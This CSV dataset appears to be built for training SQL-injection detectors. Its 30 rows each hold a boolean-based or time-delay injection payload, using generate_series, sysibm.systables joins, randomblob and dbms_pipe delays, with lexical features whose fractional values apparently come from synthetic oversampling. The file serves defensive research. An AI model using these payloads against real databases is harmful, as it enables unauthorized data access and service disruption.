id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000271,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000138,0.8814318516976939,76.95386697329045,23.523066513354777,3.443253299546674,13.761533256677389,21.71540022996783,32.0,9.47693348664522,0.1790332878094433,0.2819636860260618,0.41603227908794504,0.1229707470765498,0.0,0.2384667433226101,2.23846674332261,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,0.0,0.0,5.23846674332261,0.0,0.2384667433226102,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7615332566773898,0.2384667433226102,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,0.5981426212510808,95.46358430835332,29.0,3.7673392075691194,37.89193128702639,12.107283138329336,34.28582651066347,11.178543372334133,0.3889097242565456,0.1296642828324532,0.3636590338838584,0.11776695902714282,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.6429132553317345,0.0,0.821456627665867,1.178543372334133,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,1.495819866010171,133.5281497836755,29.4577456427685,4.008309547560555,77.9506933559905,8.0,34.2042194993795,13.3732369283055,0.5839129356477445,0.06035052910850852,0.2558050091953301,0.0999315260484169,1.0,0.0,0.915491285537,-1.3877787807814457e-17,1.0,1.0,0.0,4.457745642768501,0.0,0.0,2.0,2.915491285537,1.0,0.0,0.4577456427685,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,1.4518138314301874,113.07875975891017,30.769484104677264,3.7692395516916988,41.69319436637042,13.922886921492053,43.30845231403179,14.154226157015895,0.3669087576050876,0.1267026553460425,0.38250744523559854,0.12388114181327134,0.0,2.7694841046772636,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.384742052338631,0.0,1.0,1.0,2.0,0.0,0.6923710261693159,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.6923710261693159,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6923710261693157
SMOTE_000275,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000089,0.20741043128580847,80.93420406208108,27.605224372486475,3.888482072478747,19.539428434567558,24.0,26.394775627513525,11.0,0.24135950956147384,0.29653998495525524,0.32618634571211225,0.13591415977115864,0.0,1.0,3.0,-1.3877787807814457e-17,0.06579593791892058,2.0,0.0,3.0657959379189204,0.0,0.9342040620810794,0.9342040620810796,5.065795937918921,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.1647025059431909,130.8451062830041,28.077446858497947,3.9905087702769344,83.65148913675924,3.0774468584979466,30.96127657075103,13.154893716995891,0.6392592504143244,0.02353851172772846,0.2366249285325033,0.10057730932544381,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.0,0.0,0.1936171462448647,2.077446858497946,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000071,1.7556079430802884,107.29168730252219,29.651667492100888,3.638126079340312,33.95500247630267,13.0,44.12334488941243,16.213339936807103,0.31911436450007885,0.12279348854369188,0.409247378680206,0.14884476827602333,2.955002476302664,0.0,0.0,-1.3877787807814457e-17,1.0,1.6516674921008878,0.0,7.303334984201776,1.3033349842017758,1.0,1.0,2.651667492100888,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6516674921008878,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.651667492100888
SMOTE_000278,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,0.12534381902910238,109.39987699739166,29.90524373643026,3.4996015378804,31.96841457881009,13.0,48.557804103341226,15.87365831524035,0.2924804735017559,0.11896119870468615,0.44353291493459973,0.14502541285895823,0.9684145788100874,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,8.905243736430263,0.0,1.0,1.0,4.0,0.9684145788100875,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9684145788100875,0.03158542118991248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000279,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000042,1.1876108477409464,129.25080424955738,30.0,3.9826270850090544,72.0,8.0,34.54233687463114,14.708467374926228,0.5581280054909121,0.062014222832323565,0.2661615870127074,0.11369618466405695,0.354233687463114,0.6457663125368861,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.708467374926228,0.0,0.0,2.0,4.0,0.3542336874631138,0.6457663125368861,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.028510124962725477,90.87543413399098,30.980836020613996,3.647094628449332,20.038327958772005,16.0,39.865852144297975,14.971254030920994,0.2206225925004837,0.17610496673093048,0.43854257252345397,0.16472986824513183,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.990418010306998,0.0,5.980836020613996,0.0,1.0,1.0,2.990418010306998,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.7877695071942041,74.34025867384636,19.18998152329669,2.97784601059151,5.759926093186756,15.430055430109935,37.72022172043974,15.430055430109935,0.0797388199971445,0.20751806417994706,0.5052250516429613,0.20751806417994706,0.0,4.0,0.8100184767033113,-1.3877787807814457e-17,0.8100184767033112,2.0,0.0,5.620036953406623,2.0,0.0,0.18998152329668883,3.620036953406623,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1899815232966886,0.8100184767033112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,0.8166769335350882,77.15012261307592,18.283292462308026,2.9216545549054667,13.28329246230803,11.150122613075915,40.0,12.71670753769197,0.17233251591282722,0.14425779358342058,0.5186316402524723,0.1647780502512798,4.0,0.0,0.7167075376919716,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.0,0.0,2.7167075376919714,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2832924623080284,0.7167075376919716,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.8702997098353411,151.70365292432052,30.691362256306622,4.113345234682624,79.83953579414636,8.691362256306622,44.555479386480805,18.617275487386756,0.5277260032829129,0.057474186554666185,0.2921354934607541,0.12266431670166682,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.234550974773512,0.0,0.0,2.691362256306622,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000284,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000013,1.4872040343725619,134.6849929911472,32.0,4.258040911058256,71.6300140177056,12.93165031267679,35.6849929911472,14.4383356696176,0.532143818554777,0.0957399687453388,0.26486147203248406,0.1072547406674001,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.5616643303823987,0.0,4.0,0.0,0.0,2.4383356696176017,4.561664330382398,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5616643303823987,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5616643303823987
SMOTE_000285,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.816404180600553,114.56579680830706,32.23771978722047,3.8512204709348303,37.66403851054329,21.0,42.42631872332282,13.47543957444094,0.3283526090069535,0.1838351399274669,0.3702362154403149,0.11757603562526474,0.23771978722047016,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.23771978722047,0.0,1.0,1.0,5.0,0.23771978722047,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.23771978722047005,0.7622802127795298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000286,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000072,1.4941173909715897,138.6387727857879,32.42015340177652,3.5193898027000445,38.36122721421211,15.0,62.95815917868184,22.319386392893946,0.2777452815280399,0.10828349843457966,0.4532595151323967,0.16071170490498377,2.0,4.0,0.0,1.0,0.0,2.0,0.0,11.159693196446973,1.159693196446973,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,2.3960226053238403,121.84201795910192,34.06477061223861,3.7464321045261806,38.98577959178957,15.0,50.25908244895444,17.597155918357913,0.3169818711429736,0.12454185534918955,0.4137125537844383,0.14476371972339855,2.0,2.1295412244772187,0.9352293877613904,1.0,0.0,1.0,0.0,9.532385306119306,0.0,0.0,1.0,2.9352293877613906,1.0,0.5323853061193048,0.4676146938806952,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5323853061193048,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.532385306119305
SMOTE_000288,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000042,0.3198724955287982,125.21254830747475,30.212548307474755,4.038489797028534,72.0,8.0,31.0,14.212548307474755,0.575028350594401,0.06389203895493346,0.24758165095036716,0.11349795950029826,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.21254830747475378,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,1.7721455412788585,130.53492894993394,27.633732237483482,3.939236406401854,76.48552730615916,3.0,36.366267762516514,14.683133881258259,0.5853112179367644,0.023000644137764148,0.2790148151685753,0.11267332275689615,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.6831338812582586,0.0,5.0,0.0,0.0,2.0,1.6831338812582581,1.0,0.0,0.0,0.0,0.0,0.6831338812582586,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000290,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000035,0.520983738328702,140.40486629327523,30.1993917133406,3.8827328947562663,46.90334557662671,15.900304143329702,51.800608286659404,25.800608286659404,0.3336039285604618,0.11331127474068936,0.3692506891043664,0.18383410759448243,0.0,3.601216573318805,0.1993917133405978,-1.3877787807814457e-17,0.0,1.9003041433297012,0.0,10.0996958566703,0.0,2.0,1.0,8.099695856670298,0.0,0.900304143329701,0.0996958566702989,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9003041433297012,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.900304143329701
SMOTE_000291,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,1.3348275486206387,121.48614015622013,32.0,4.010927608651692,49.841705006210574,18.902771968755975,39.32221757500478,13.419445606248805,0.4010948734807531,0.15918115694563395,0.3285528884751262,0.11117108109848672,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.161108787502389,0.0,0.5805543937511948,1.4194456062488054,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000292,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.49785118402729717,76.77343166117443,28.318573145096902,3.900887468332399,20.046002403135663,21.0,26.0,9.727429258038761,0.2601906582236936,0.27401671035216224,0.3392587842455342,0.12653384717861002,0.0,0.8637146290193806,2.0,-1.3877787807814457e-17,0.13628537098061955,2.0,0.0,3.0,0.0,0.8637146290193805,0.8637146290193806,4.1362853709806195,0.0,0.8637146290193805,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,1.2158926820432951,108.52338520892785,32.47661479107216,3.6652827845324265,31.523385208927845,15.0,46.0,16.0,0.2904604707005984,0.13822198622715617,0.42388075776327894,0.14743678530896656,2.0,0.0,2.0,1.0,0.0,1.0,0.0,9.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5233852089278433,0.47661479107215665,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000294,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,2.125497870089493,72.52945410587824,15.487428226047188,2.4682300088836056,4.6806752932770195,10.890804692432273,41.9159482403379,15.042025879831051,0.06447427892247765,0.14143902197963992,0.5867552773182618,0.2073314217796205,0.0,4.0,0.680675293277017,-1.3877787807814457e-17,0.6806752932770169,1.680675293277017,0.0,6.638649413445966,1.3613505865540338,0.0,0.0,3.042025879831051,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.680675293277017,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.680675293277017
SMOTE_000295,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000135,0.36452603453805227,143.35493148423572,32.0,3.8766711906645064,41.729578491511546,24.0,52.62535299272418,25.0,0.2909154000427521,0.16753664899492696,0.367030608259272,0.17451734270304892,0.0,0.8957745012126364,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.104225498787363,0.0,2.0,1.0,10.0,0.0,0.8957745012126366,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.10422549878736365,0.8957745012126365,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,1.8845157227299403,133.71860460818692,30.242209308771958,3.9108285918494903,58.30453483859628,14.75779069122804,45.82813953918131,14.828139539181306,0.43258470551443934,0.11014249621469585,0.3452007969981144,0.11207200127275042,0.0,1.656279078362613,0.0,-1.3877787807814457e-17,1.0,1.5859302304093468,0.0,6.828139539181306,0.0,0.4140697695906533,1.5859302304093468,2.585930230409347,0.0,0.4140697695906531,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000297,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000099,0.6575290279916431,141.474122340468,32.24647122824564,4.072308348266644,71.0,8.748823742748545,42.98117988397673,18.74411871374273,0.5043448878273072,0.06192163206094281,0.30171154791524263,0.13202193219650726,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.246471228245637,1.0,0.0,2.7488237427485456,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,1.1342972864337673,74.42790942627266,18.485581885254533,2.8146892847082317,5.0,13.942327541018134,40.0,15.485581885254533,0.06725477144095182,0.18663648445851977,0.5380381715276142,0.20807057257291423,0.0,4.0,1.0,-1.3877787807814457e-17,0.4855818852545332,2.0,0.0,6.0,2.0,0.0,0.0,3.4855818852545335,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,3.492020430665836,136.37095841617804,28.5219924393051,4.0166273733992135,77.5659773179153,5.2829886589576525,38.141494329478824,15.380498109826275,0.568925267307925,0.03734946214052319,0.28054092774868233,0.1131843428028694,2.2390037803474496,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,0.0,2.3804981098262754,2.0,1.0,0.0,0.0,0.3804981098262752,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000300,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000112,2.0845016750157357,137.33417673981222,32.507896345723225,3.5283355413014013,38.42893288849095,15.0,61.905243851321266,22.0,0.27894831175168844,0.10986312773477425,0.4500559731692018,0.16113258734433555,6.0,0.0,0.0,1.0,0.0,2.0,0.0,10.984207308553545,1.0157926914464552,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4921036542767725,0.5078963457232276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
